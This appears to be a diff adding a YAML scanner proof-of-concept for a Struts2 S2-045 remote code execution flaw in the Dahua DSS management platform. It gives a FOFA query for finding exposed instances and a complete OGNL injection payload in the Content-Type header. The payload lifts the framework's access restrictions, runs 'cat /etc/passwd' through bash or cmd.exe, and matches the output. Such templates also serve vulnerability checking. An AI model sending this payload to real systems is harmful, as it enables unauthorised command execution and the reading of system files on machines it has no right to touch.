@@ -1,0 +1,19 @@
+id: poc-yaml-dahua-dss-user-tologinpage-action-struct2-045-rce
+info:
+  name: 大华 DSS user_toLoginPage.action Struct2-045 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 大华DSS综合管理平台
+  fofa: app="dahua-DSS"
+requests:
+- method: POST
+  path: /config/user_toLoginPage.action
+  headers:
+    Content-Type: '%{(#nike=''multipart/form-data'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[''com.opensymphony.xwork2.ActionContext.container'']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=''cat
+      /etc/passwd'').(#iswin=(@java.lang.System@getProperty(''os.name'').toLowerCase().contains(''win''))).(#cmds=(#iswin?{''cmd.exe'',''/c'',#cmd}:{''/bin/bash'',''-c'',#cmd})).(#p=new
+      java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'
+  expression: status_code == 200 && contains(body,"root") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
